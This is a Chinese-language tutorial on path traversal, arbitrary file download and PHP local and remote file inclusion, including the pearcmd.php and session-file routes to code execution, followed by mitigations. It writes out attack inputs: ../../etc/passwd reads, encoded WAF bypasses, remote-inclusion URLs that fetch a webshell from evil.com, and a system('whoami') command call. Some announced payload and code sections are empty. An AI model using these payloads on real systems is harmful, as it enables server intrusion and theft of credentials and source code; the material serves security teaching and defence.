文件包含、任意文件下载与文件上传属于 Web 经典文件类漏洞，经常组合利用：任意文件下载多用于读取配置、源码，收集信息为后续攻击铺路；文件上传可上传恶意脚本，但常需要文件包含漏洞来触发脚本执行；文件包含本身一般也不能直接 RCE，需要依托文件上传、日志写入、Session 注入等方式写入恶意代码，三者相互配合，共同达成远程代码执行（RCE）的目标。

路径穿越（Path Traversal）

别名：目录穿越、常叫目录遍历漏洞，CWE 编号：CWE-22，路径穿越，在RCE，文件上传都提到过，简单一句话：攻击者利用../这类字符，跳出程序限定的目录，读取服务器上任意文件。

操作系统会解析../为向上跳一级目录，最终路径变成/etc/passwd，成功跳出限制目录，读取系统敏感文件。

Windows 系统同理，使用..\，例如：..\..\windows\system32\drivers\etc\hosts

注意：../在 URL 中需要 URL 编码，%2E%2E%2F，很多 WAF 只拦截明文../，编码后可绕过。

产生根本原因

1、信任用户可控输入：直接把用户传入的参数拼接到文件路径里，没有校验。
2、没有做路径规范化 / 白名单限制

  • 没有校验最终解析后的真实路径是否在允许的目录范围内。
  • 只做简单黑名单过滤（替换../），很容易被绕过。

3、操作系统文件系统特性：../是系统原生语法，代表父目录；程序调用系统文件 API 时，系统自动解析这个相对路径。

漏洞能造成什么危害

1、读取服务器任意文件：

  • Linux：/etc/passwd、数据库配置文件config.php、ssh 私钥、web 源码。
  • Windows：hosts 文件、系统日志、网站数据库账号密码。

2、配合其他漏洞：读取源码找到 SQL 注入、文件上传点，进一步拿下服务器。
3、一般不能直接写入文件（路径穿越大多是读文件；如果是文件写入接口，则会变成任意文件写入漏洞）。

区分：路径穿越≠文件包含漏洞

  • 路径遍历：读取服务器本地任意文件，不需要 PHP 的 include 等包含函数，只是文件读取。
  • **文件包含 (LFI)**：使用include/require函数，不仅读文件，还会解析文件内 PHP 代码，可以执行代码。

修复方案（推荐优先用白名单，黑名单不推荐）

方案 1：白名单（最安全）

允许的文件名固定列表，用户输入只能选择列表内的值，不允许直接传文件名。

方案 2：路径规范化 + 校验真实路径（强烈推荐）

拿到用户输入拼接路径后，获取文件的绝对真实路径，判断这个路径是否在预设的安全目录内。 Python 示例思路：

原理：os.path.abspath会自动解析所有../，拿到解析后的真实路径，再做前缀校验。

方案 3：过滤输入（仅作为辅助，不能单独依赖）

过滤../、..\、%00等危险字符，黑名单很容易绕过，只能做兜底。

额外安全加固

1、Web 进程使用低权限账号运行，即使漏洞被利用，也无法读取高权限文件。
2、限制文件目录权限，敏感配置文件禁止 web 用户可读。

文件下载

原理

用户可控参数直接拼接文件路径，服务端读取文件内容返回给浏览器；只读取文件，不会执行代码，任意文件下载漏洞最常用的利用手段就是路径穿越（目录遍历 ../），但二者概念不能等同：

  • 路径穿越（目录遍历）：是攻击手段 / Payload 方式，用../跳出预设目录
  • 任意文件下载：是漏洞名称（业务场景），下载接口存在文件读取，配合路径穿越读取系统敏感文件

文件下载漏洞不只有路径穿越这一种利用方式，还可以用php://filter伪协议直接读取源码，不需要../

传入?file=../../etc/passwd，服务端读取文件并输出内容，不会解析 php 代码。

3、未做路径校验、白名单、目录限制，可穿越到非预期目录

5、各类网盘、CMS、OA 系统的文件接口

1、准备敏感文件字典（linux 常用：/etc/passwd、/etc/shadow、数据库配置文件config.php、wwwroot/config.inc.php等；Windows：C:\windows\system32\drivers\etc\hosts、网站配置文件）
2、使用 Burp Intruder /ffuf/wfuzz 批量发包，把字典里的文件路径替换进参数
3、根据响应长度、状态码、页面内容判断文件是否存在、是否读取成功

示例 payload 模板： ?file=../../FUZZ

优点

  • 快速批量探测常见敏感文件，不用一个个手动猜
  • 适合 CTF、渗透测试信息收集阶段

局限

1、字典覆盖不全：如果目标是自定义命名的文件（比如随机命名的数据库备份backup_202609.sql），字典里没有，爆破不出来。字典只能命中常见通用敏感文件。
2、权限问题：就算文件存在，如果 web 用户没有读权限，爆破也读取失败。
3、返回结果干扰
很多网站统一返回相同报错页面（例如 “文件不存在” 固定页面，长度一致），单纯看状态码无法区分；需要看响应长度差异、关键词匹配。
4、路径层级不确定 不知道网站根目录离目标文件需要几个../，有可能需要同时爆破../层数 + 文件名，工作量变大。

更好的思路（顺序）

1、先用通用敏感文件字典爆破，尝试读取系统文件、网站配置文件
2、如果读到配置文件、源码，从源码里挖掘更多文件名和路径（比盲猜字典靠谱得多）
3、拿到源码后再针对性找备份文件、日志路径等

文件包含

原理

一句话：后端把用户可控的变量，直接丢进 include /require 这类包含函数，加载对应文件。文件里如果有 PHP 代码，会被服务器解析执行。

什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。

有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。

核心特点：不仅读取文件内容，还会执行里面的 PHP 代码，这是和文件下载最大区别。

出现位置（风险场景）

1、页面模板加载，通过 GET 参数选择页面（?file=xxx.php）
2、语言切换功能，参数控制加载不同语言文件
3、主题 / 皮肤切换，参数指定主题文件
4、插件、模块加载功能，用户可控传入模块名

危险函数（PHP）

1、include()：包含文件，找不到文件只警告，继续运行
2、include_once()：同上，只包含一次
3、require()：包含文件，找不到直接报错终止程序
4、require_once()：同上，只包含一次

只要可控参数直接传入这 4 个函数，就存在文件包含风险。
加上后缀_once的作用区别就是：如果文件已经包含过了，那么不会再次包含

正常访问：?file=home.php → 加载首页 攻击：?file=../../etc/passwd → 读取本地文件

产生条件

1、使用危险包含函数：include / include_once / require / require_once
2、传入函数的文件路径用户可控
3、未做严格校验 / 过滤，可构造特殊路径或伪协议
4、RFI 额外条件：allow_url_include = On

危害

1、读取服务器任意本地文件（配置、密码、源码）
2、读取 PHP 源码（php://filter）
3、可控文件内容时，执行恶意代码，获取 WebShell
4、RFI 可直接加载远程恶意代码执行
5、信息泄露、服务器沦陷、横向渗透

防护原则

1、优先白名单，仅允许预设合法文件
2、禁止用户可控参数直接拼接传入包含函数
3、关闭allow_url_include
4、过滤危险字符与伪协议（../、php://、zip:// 等）
5、做路径解析校验，限制文件访问目录范围
6、网站以最小权限运行 Web 服务进程

分类

无论是本地还是远程，不论被包含的文件后缀，只要文件内存在合法 PHP 标签包裹的可控 PHP 代码，且 PHP 引擎会对 include 加载的内容进行 PHP 代码解析，被 include 包含时就会执行其中 PHP 代码。

分类：LFI & RFI

LFI：Local File Inclusion 本地文件包含

只能读取服务器本地磁盘上的文件，不能加载外网文件。 前提：allow_url_include = Off（PHP 默认配置，现在绝大多数环境都是这个），LFI 常用 Payload：

php 文件直接包含会被 PHP 引擎执行，看不到源码；用 filter 伪协议读取源码并 base64 编码返回，拿到 base64 解码就能看源码。

RFI：Remote File Inclusion 远程文件包含

可以直接包含外网服务器上的文件，远程文件中的 PHP 代码会在当前服务器执行，直接拿 shell。 前提：allow_url_include = On（新版 PHP 默认关闭，现在很少见到），RFI Payload：

shell.txt 里面写一句话木马，远程加载，当前服务器执行代码。
include 直接加载远程 http/ftp 资源（http://xxx/shell.txt），这里的 http:// 属于网络协议，不属于 PHP 伪协议。

allow_url_include：为on时，就可使用include和require等方式包含远程文件。

伪协议利用

伪协议只能用来读文件吗？

  • 不是全部伪协议都只能读文件；部分伪协议可以直接实现代码执行，不需要读取磁盘文件。

为什么 文件包含 叫伪协议，SSRF 里直接叫协议？

  • 本质：php 伪协议 是 PHP 内核自己实现的、只存在于 PHP 运行环境，只在 PHP 文件处理流包装器 (stream wrapper)，是 PHP 为了统一读写抽象出来的虚拟 “协议”，不是网络通信协议，不需要走网卡发包。不属于 TCP/IP 网络协议栈协议。仅 PHP 的文件系列函数（include/file_get_contents/fopen）能识别。
  • SSRF 的http://、https://、gopher://、ftp://是网络协议，属于 TCP/IP 协议族。操作系统底层就支持，是跨程序、跨主机通信标准。作用：网络之间收发数据包，操作系统 socket 支持，不止 PHP 能用，curl、python、浏览器都能调用。

data:// 比较特殊，它既是 PHP 流包装器（伪协议），本身也是 RFC 定义的 URI 标准协议，所以在不同场景叫法会有交叉。

php://filter

作用：对文件读取内容做过滤器处理（编码、转换），最常用读取 PHP 源码。

特点：LFI 最高频，不需要 allow_url_include、拓展：还有 rot13 编码过滤器 convert.rot13

三. Session 文件包含（Session 注入）

前置基础：PHP Session 机制

用户访问网站，服务端生成PHPSESSID（Cookie）；服务器在磁盘生成文件保存该用户的会话数据。 Linux 默认存放路径：/tmp/ 文件名格式：sess_xxxxxx，xxxxxx就是 Cookie 里 PHPSESSID 的值。 示例：sess_9a2b3c4d5e6f7g 文件内存储格式：会话变量名|类型:长度:值 示例内容：username|s:5:"admin";

原理：网站会把 Session 数据保存在服务器磁盘上的 session 文件；攻击者可控 session 存储内容，将 PHP 一句话写入 session 文件，再利用 LFI 漏洞包含这个 session 文件，include 解析执行里面的 PHP 代码。
和日志包含对比：日志是 Web 服务写入；session 文件是PHP 程序本身写入。

前提：
1、可控 Session 存储内容（页面可以写入 session）
2、知道 session 文件存放路径（Linux 一般/tmp/sess_xxxxxx）
3、服务器 session 文件未被严格过滤

获取session的存储位置一般方式：
1、通过phpinfo的信息获取session的存储位置。 通过phpinfo的信息获取session.save_path
2、通过猜测默认的session存储位置进行尝试 通常Linux中的Session的默认存储位置在/var/lib/php/session目录下

  • 说明：启用上传进度功能。当设置为 on 时，PHP 将允许在文件上传过程中追踪进度。需要与其他相关配置一起使用。
  • 说明：启用上传进度的清理功能。当设置为 on 时，PHP 会在上传完成后自动清理与上传进度相关的临时 Session 数据。这样可以防止过多的进度信息占用内存。
  • 说明：设置上传进度 Session 变量的前缀。PHP 会创建一个以该前缀开头的 Session 变量来存储上传进度信息。默认情况下，上传进度变量的名称会是 upload_progress_[session_id] 的形式。

pearcmd.php LFI→GetShell（CTF 高频，LFI2RCE）

大佬文章：首页 | 离别歌

核心原理

pearcmd.php 是 PHP PEAR 扩展自带的命令行脚本，读取参数依赖$_SERVER['argv']。 当register_argc_argv=On时，GET 查询字符串里用+分割的内容，会被 PHP 填入$_SERVER['argv']； 如果存在 LFI 漏洞，我们用 LFI 包含pearcmd.php，同时控制 URL 查询串，就相当于调用 pear 命令。 重点命令：config-create，作用创建文件，第一个参数为文件内容，第二个参数为写入路径，直接写一句话木马到服务器本地，完成 LFI 到 RCE。

利用前置条件（缺一不可，考点）

1、目标安装 PEAR，存在pearcmd.php，常见路径： /usr/local/lib/php/pearcmd.php、/usr/share/php/pearcmd.php
2、register_argc_argv = On（开启，$_SERVER['argv']才可控）
3、存在 LFI，可包含本地 php 文件；无open_basedir严格限制
4、Web 进程对目标写入目录（如/tmp）拥有写入权限

适用场景：普通 LFI 无法直接写文件，但可以包含 pearcmd；甚至后端自动追加.php后缀的有限制 LFI 场景也能用。

Payload 格式

参数拆解

  • +config-create：pear 的创建配置文件命令，+用来分割 argv 数组
  • /：占位符，config-create需要两个参数
  • &file=/xxx/pearcmd.php：LFI 的文件包含参数，包含 pearcmd.php
  • /：写入文件的内容（一句话木马）
  • /tmp/shell.php：写入的目标文件路径

完整攻击步骤

1、探测：尝试包含 pearcmd.php，页面返回 PEAR 命令帮助信息，确认文件存在。
2、构造上面 payload 发起 GET 请求，pearcmd 执行config-create，在服务器 /tmp 生成 shell.php，文件内写入一句话木马。
3、再次利用 LFI 包含/tmp/shell.php，传入 POST 参数cmd=system('whoami');，实现 RCE getshell。

两种场景

1、不出网（config-create，最常用）：上面这套，本地直接写 shell，不需要服务器对外出网。
2、可出网（pear install）

含义：pear 从远程 vps 下载 shell.php 保存到/tmp，再包含执行。

缺点：要求目标服务器能访问外网，很多靶机 / 内网环境无法使用。

后端会在我们传入参数后面硬拼接.php。 如果直接写http://evil.com/shell.txt，拼接后变成 http://evil.com/shell.txt.php，访问不到目标恶意文件，漏洞利用被限制，这就是有限制 RFI。 前提依旧：allow_url_include=On

1、? 问号绕过（最常用）

Payload：?file=http://evil.com/shell?
拼接结果：http://evil.com/shell?.php
原理：远程 URL 里的?代表查询参数。远程 Web 服务器会把?后面全部当成GET 参数，不再当作文件路径。.php变成 URL 参数被忽略，实际请求文件是shell。

在 VPS 上放置shell文件（不带后缀），里面写入一句话木马。

2、# 井号绕过，URL 编码为%23

Payload：?file=http://evil.com/shell%23
拼接结果：http://evil.com/shell#.php
原理：#是 URL 锚点（片段），服务端不解析 #后面内容，.php被直接丢弃。

补充旧版本 PHP：%00空字节截断（PHP<5.3.4），?file=http://evil.com/shell.txt%00，%00 截断后面拼接的.php；新版本 PHP 已经失效。

文件包含防护 + 现状

防护措施

1、根本方案：白名单 不要直接把用户输入拼接进include。只允许传入预设的文件名标识，根据标识映射文件，用户无法控制文件路径。

示例：传?page=1，后端代码判断 1 对应index.php，不直接拼接用户输入。

2、关闭危险 PHP 配置allow_url_include = Off（现代默认关闭，直接杜绝 RFI）；register_argc_argv = Off，阻碍 pearcmd 这类 LFI2RCE 利用链。
3、目录限制 open_basedir 限定 PHP 进程仅能访问指定目录，即使存在 LFI，也无法读取目录外的系统文件（/etc/passwd、日志、session 目录等），是很有效的缓解手段，但不能根治漏洞，仅限制访问范围。
4、输入过滤与校验 过滤../、..\、php://、zip://、phar://等伪协议与路径穿越字符； 拿到用户输入后，使用realpath()获取文件真实路径，校验路径是否在允许目录内。
5、最小权限原则 Web 服务运行账号权限尽量低：禁止读取日志目录、session 目录、系统敏感文件；就算存在 LFI，也没有权限读取目标文件，阻碍 LFI getshell 利用链（日志包含、session 包含）。
6、代码规范 禁止 include($_GET['xxx']) 这类直接将用户可控变量传入包含函数。

现代现状

1、RFI（远程文件包含）几乎绝迹 新版 PHP 默认allow_url_include=Off，RFI 很难遇到，CTF 靶场才会专门开启。
2、LFI（本地文件包含）仍然存在，但单纯 LFI 很难直接 RCE 现代环境大多：

  • 配置了open_basedir
  • Web 账号权限严格，无法读取/tmp、日志文件
  • 输入做了转义 / 过滤 单纯 LFI 大多只能做到信息泄露；想要 getshell 必须依赖额外利用链：日志包含、session、pearcmd、phar 等，属于LFI + 辅助条件的组合漏洞。

3、常见出现场景 老旧源码、CMS、自研后台、靶场。成熟框架（Laravel、ThinkPHP 新版本）默认不会直接动态包含文件，这类漏洞在成熟商用产品较少。
4、WAF 的作用 WAF 可以拦截php://filter、../等 payload，但容易被绕过，WAF 只能做辅助防护，不能替代代码层修复。

任意文件下载 / 目录遍历防护 + 现状

防护措施

1、最优方案：ID 映射 前端传递文件 id，数据库存储 id 与文件真实物理路径；用户无法接触真实文件名、路径。后端根据 id 查询得到路径再读取文件，完全隔离用户输入和真实路径。
2、白名单校验 如果必须传文件名，维护允许下载的文件名白名单，只放行列表内文件，其余全部拒绝。
3、路径校验（如果必须接收文件名字符串）

  • 拼接基础固定目录，再用realpath()获取文件真实绝对路径；
  • 判断真实路径是否在预设的允许目录之内，不在则拦截。

不要单纯靠过滤../，容易被双写、编码等方式绕过。

4、输入过滤 过滤../、..\、各类伪协议关键字（php://）、%00等危险字符；过滤各种 URL 编码 payload。
5、最小权限 Web 进程账号仅对下载目录拥有读权限，禁止读取网站源码、系统配置、日志等其他目录。
6、禁止直接使用用户输入作为文件路径 不要直接：readfile($_GET['file'])，杜绝原始用户输入直接传入文件读取函数。

现代现状

1、相比文件包含，任意文件下载漏洞在实战中更常见 业务普遍存在文件下载、附件预览功能，开发容易偷懒直接传入文件名参数；很多开发只简单过滤../，容易被绕过。
2、漏洞危害以信息泄露为主，无法直接 RCE 就算漏洞存在，只能读取文件，不会执行代码。常用来拿数据库配置、源码、密钥，作为后续渗透的前置信息收集。
3、WAF 只能辅助防御 WAF 可以拦截../、php://filter等 payload，但编码、特殊路径写法可绕过；WAF 不能替代代码层面修复。
4、成熟框架现状 主流框架没有原生的文件下载漏洞，但开发者自己写下载接口很容易引入漏洞，属于开发人员编码失误带来的漏洞，不是框架本身漏洞。
5、常见出现位置 自研后台、CMS 附件下载、文件预览模块、文档管理系统。
